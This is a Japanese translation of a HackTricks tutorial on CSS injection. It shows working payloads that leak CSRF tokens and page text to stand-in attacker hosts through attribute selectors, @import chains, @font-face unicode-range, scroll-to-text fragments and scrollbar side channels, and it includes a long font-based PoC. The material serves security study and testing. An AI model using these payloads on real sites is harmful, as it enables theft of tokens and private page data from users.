# CSSインジェクション

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## CSSインジェクション

### 属性セレクタ

CSSインジェクションを介して情報を抽出する主な技術は、**CSSでテキストをマッチさせ**、その**テキストが存在する**場合に**外部リソースを読み込むことです。例えば：**
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
ただし、例で**csrf name input**が**type hidden**（通常はそうです）の場合、この技術は機能しないことに注意してください。なぜなら、背景がロードされないからです。
しかし、隠された要素に背景をロードさせる代わりに、**それに続く何かに背景をロードさせることで**、この障害を**回避**することができます：
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
以下は、この技術を利用するためのコード例です： [https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e)

#### 前提条件

1. CSSインジェクションは、十分に長いペイロードを許可する必要があります
2. 新しく生成されたペイロードのCSS再評価をトリガーするために**ページをフレーム化する能力**
3. **外部ホストされた画像**を使用する能力（CSPによってブロックされる可能性があります）

### Blind Attribute Selector

[**この投稿で説明されているように**](https://portswigger.net/research/blind-css-exfiltration)、セレクタ**`:has`** と **`:not`** を組み合わせることで、ブラインド要素からでもコンテンツを識別することが可能です。これは、CSSインジェクションを読み込むウェブページの中身が何かわからないときに非常に役立ちます。\
また、これらのセレクタを使用して、同じタイプの複数のブロックから情報を抽出することも可能です。例えば：
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
以下の **@import** 技術と組み合わせることで、[**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)を使用して**盲目のページからCSSインジェクションを使って多くの情報を抽出する**ことが可能です。

### @import

前述の技術にはいくつかの欠点があります。確認してください。あなたは**被害者に複数のリンクを送る**ことができるか、または**CSSインジェクションに脆弱なページをiframeする**ことができる必要があります。

しかし、**CSS `@import`** を使用する別の巧妙な技術があります。

これは最初に [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) によって示され、次のように機能します：

前述のように、同じページを何度も異なるペイロードで何十回も読み込む代わりに、**ページを一度だけ読み込み、攻撃者のサーバーへのインポートだけを行います**（これが被害者に送るペイロードです）：
```css
@import url('//attacker.com:5001/start?');
```
1. インポートは攻撃者からの**CSSスクリプトを受け取り**、**ブラウザがそれを読み込む**ことになります。
2. 攻撃者が送るCSSスクリプトの最初の部分は、**再び攻撃者のサーバーへの別の`@import`になります。**
3. 攻撃者のサーバーはこのリクエストにまだ応答しません。なぜなら、いくつかの文字を漏らしてから、次の文字を漏らすためのペイロードと共にこのインポートに応答したいからです。
4. ペイロードの二番目で大きな部分は、**属性セレクタ漏洩ペイロード**になります。
5. これにより、**秘密の最初の文字と最後の文字**が攻撃者のサーバーに送信されます。
6. 攻撃者のサーバーが**秘密の最初と最後の文字**を受け取ると、**ステップ2で要求されたインポートに応答します**。
7. 応答は**ステップ2、3、4と全く同じ**になりますが、今回は**秘密の二番目の文字とその前の文字を見つけようとします**。

攻撃者は、秘密を完全に漏らすことができるまで、**そのループを続けます**。

元の[**Pepe Vilaのこの攻撃を利用するコードはこちら**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231)で見つけることができます。または、ほぼ[**同じコードですが、こちらでコメント付きです**。](./#css-injection)

{% hint style="info" %}
スクリプトは、属性セレクタを使用して以下のようなことができるため、毎回2文字（始めからと終わりから）を発見しようとします：
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
このスクリプトにより、秘密がより速く漏れます。
{% endhint %}

{% hint style="warning" %}
時々、スクリプトは**プレフィックスとサフィックスが既に完全なフラグであることを正しく検出しない**ことがあり、前方（プレフィックスで）と後方（サフィックスで）に進み続け、ある時点で停止します。\
心配無用です。**出力を確認してください**。そこで**フラグが見えます**。
{% endhint %}

### 他のセレクター

**CSSセレクター**を使用してDOMの部分にアクセスする他の方法：

* **`.class-to-search:nth-child(2)`**: DOM内の"class-to-search"クラスの2番目のアイテムを検索します。
*   **`:empty`** セレクター: 例えば[**このライトアップ**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)で使用されています**：**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### エラーベースのXS-Search

**参照:** [CSSベースの攻撃: @font-faceのunicode-rangeの悪用](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

基本的な考え方は、**リソースがロードできない場合にのみ表示されるテキスト**で、**私たちが制御するエンドポイントからカスタムフォントを使用する**ことです。
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://ourenpoint.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
### スクロール・トゥ・テキスト・フラグメントのスタイリング

**URLフラグメントが要素を対象とする場合**、[**`:target`**](https://drafts.csswg.org/selectors-4/#the-target-pseudo) 疑似クラスを使用してそれを選択できますが、**`::target-text` は何も一致しません**。これは、\[フラグメント]によって直接対象とされるテキストのみに一致します。

したがって、攻撃者は **スクロール・トゥ・テキスト** フラグメントを使用し、そのテキストで**何かが見つかった場合**、攻撃者のサーバーからリソースを**ロードする**（**HTMLインジェクション**を介して）ことで、それを示すことができます。
```css
:target::before { content : url(target.png) }
```
攻撃の例は以下の通りです:

{% code overflow="wrap" %}
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
{% endcode %}

これは**HTMLインジェクションを送信してコードを悪用する**ことです：

{% code overflow="wrap" %}
```css
<style>:target::before { content : url(http://attackers-domain/?confirmed_existence_of_Administrator_username) }</style>
```
{% endcode %}

スクロール・トゥ・テキスト・フラグメントを使用した場合： **`#:~:text=Administrator`**

単語「Administrator」が見つかった場合、指定されたリソースがロードされます。

主な3つの軽減策があります：

1. **STTFはウェブページ上の単語や文章のみに一致することができる**ため、理論的にはランダムなシークレットやトークンを漏洩することは不可能です（シークレットを一文字の段落に分解しない限り）。
2. **トップレベルのブラウジングコンテキストに制限されている**ため、iframe内では機能せず、攻撃が**被害者に見える**ようになっています。
3. **STTFが機能するためにはユーザーのアクティベーションジェスチャーが必要**ですので、ユーザーのアクションが原因であるナビゲーションのみが悪用可能であり、ユーザーのインタラクションなしに攻撃を自動化する可能性を大幅に減少させます。ただし、上記のブログ投稿の著者が発見した特定の条件により、攻撃の自動化を容易にすることができます。別の類似のケースは、PoC#3で紹介されます。
1. **ソーシャルエンジニアリング**や**一般的なブラウザ拡張機能を強制的にインタラクトさせる**など、これを回避する方法がいくつかあります。

詳細については、元のレポートを確認してください： [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

[**この技術を使用したCTFのためのエクスプロイトはこちら**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb)で確認できます。

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

ページ内に存在する特定のユニコード値に対してのみ**集められる**、**外部フォントを指定する**ことができます。例えば：
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
このページにアクセスすると、ChromeとFirefoxはsensitive-informationのテキストノードに「A」と「B」の文字が含まれているため「?A」と「?B」をフェッチします。しかし、「C」を含まないため「?C」はフェッチしません。これは、「A」と「B」を読み取ることができたことを意味します。

### テキストノードの流出 (I): 合字 <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**参照:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

ノードに含まれるテキストは、**合字**と**幅の変化の検出**を組み合わせた技術で抽出できます。この技術の主なアイデアは、**大きなサイズ**の事前定義された合字を含むフォントの作成と、**サイズ変更をオラクルとして使用する**ことです。

フォントはSVGフォントとして作成し、fontforgeでwoffに変換できます。SVGでは、**horiz-adv-x**属性を介してグリフの幅を定義できるので、`<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`のようなものを構築できます。**XYは2文字のシーケンスです**。**シーケンスが存在する場合、それはレンダリングされ、テキストのサイズが変わります**。しかし、これらの変化をどのように検出できるでしょうか？

属性white-spaceが**nowrap**として定義されている場合、テキストは親の幅を超えたときに改行されないように強制されます。この状況では、**水平スクロールバーが表示されます**。そして、そのスクロールバーのスタイルを**定義できる**ので、これが起こったときに流出を検出できます **:)**
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://ourendpoint.com/?leak); }
```
この時点で攻撃は明確です：

1. **二文字の組み合わせで非常に幅の広い** **フォント**を作成する
2. **スクロールバーのトリックを使って漏洩を検出する**
3. 最初に漏れたリガチャーを基にして、**3文字の新しい組み合わせ**を作成する（前後に文字を追加）
4. **3文字のリガチャーを検出する**。
5. **テキスト全体が漏れるまで繰り返す**

反復を開始するための改善された方法がまだ必要です。`<meta refresh=...`は最適ではありません。**CSS @importのトリックを使用してエクスプロイトを最適化する**ことができます。

### テキストノードのエクスフィルトレーション（II）：デフォルトフォントを使用して文字セットを漏らす（外部アセットを必要としない） <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**参照：** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

このトリックはこの[**Slackersスレッド**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/)で公開されました。ブラウザにインストールされている**デフォルトフォントを使用して**、テキストノードで使用される文字セットを漏らすことができます：外部フォントやカスタムフォントは必要ありません。

キーは、アニメーションを使用して**divの幅を0からテキストの最後まで増やす**ことです。これにより、テキストを2つの部分に「分割」することができます：「プレフィックス」（最初の行）と「サフィックス」です。そのため、divの幅が増えるたびに新しい文字が「サフィックス」から「プレフィックス」に移動します。例えば：

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

新しい文字が最初の行に移動すると、**unicode-rangeのトリックを使用してプレフィックスの新しい文字を検出します**。この検出は、高さが高いComic Sansフォントに変更することで行われ、**垂直スクロールバーがトリガーされます**（文字の値が漏れます）。この方法で、異なる文字を一度に漏らすことができます。**文字が繰り返されていることは検出できますが、どの文字が繰り返されているかは検出できません**。

{% hint style="info" %}
基本的に、**unicode-rangeは文字を検出するために使用されます**が、外部フォントをロードしたくないので、別の方法を見つける必要があります。\
**文字が見つかった時**、事前にインストールされた**Comic Sansフォント**が**与えられ**、文字を**大きくし**、スクロールバーを**トリガーする**ことで**見つかった文字を漏らします**。
{% endhint %}

PoCから抜粋したコードを確認してください：
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### テキストノードの流出 (III): 要素を隠すことでデフォルトフォントを使用してcharsetを流出させる（外部アセット不要） <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**参照:** これは[このライトアップで成功しなかった解決策として言及されています](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

このケースは前のケースと非常に似ていますが、ここでは特定の**文字を他の文字より大きくする目的は何かを隠すことです**。例えば、ボットによって押されないようなボタンや、ロードされない画像などです。したがって、アクション（またはアクションの欠如）を測定し、特定の文字がテキスト内に存在するかどうかを知ることができます。

### テキストノードの流出 (III): キャッシュタイミングによるcharsetの流出（外部アセット不要） <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**参照:** これは[このライトアップで成功しなかった解決策として言及されています](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

このケースでは、同じオリジンから偽のフォントをロードすることで、テキスト内に文字があるかどうかを流出させることができます：
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
一致がある場合、**フォントは`/static/bootstrap.min.css?q=1`からロードされます**。成功しなくても、**ブラウザはそれをキャッシュするべきです**。キャッシュがなくても、**304 not modified**メカニズムがあるため、**応答は他のものより速くなるべきです**。

しかし、キャッシュされた応答とキャッシュされていない応答の時間差が十分に大きくない場合、これは役に立ちません。例えば、著者は次のように述べています：しかし、テストした後、最初の問題は速度があまり変わらないこと、二番目の問題はボットが`disk-cache-size=1`フラグを使用していることで、これは本当に考えられています。

### テキストノードの流出 (III): 数百のローカル"フォント"をタイミングでロードしてcharsetを漏らす（外部アセットを必要としない） <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**参照:** これは[このライトアップで成功しなかった解決策として言及されています](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

この場合、一致があるときに同じオリジンから数百の偽フォントをロードするように**CSSを指示する**ことができます。この方法で、**時間を測定**し、次のようなものを使って文字が現れるかどうかを判断できます：
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
And the bot’s code looks like this:

ボットのコードは以下のようになります：
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
```markdown
したがって、フォントが一致しない場合、ボットにアクセスしたときの応答時間は約30秒になると仮定します。一致する場合は、フォントを取得するために多くのリクエストが送信され、ネットワークには常に何かがあるため、停止条件を満たして応答を得るのに時間がかかります。したがって、応答時間は一致があるかどうかを教えてくれます。

## 参考文献

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください。**
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>
```
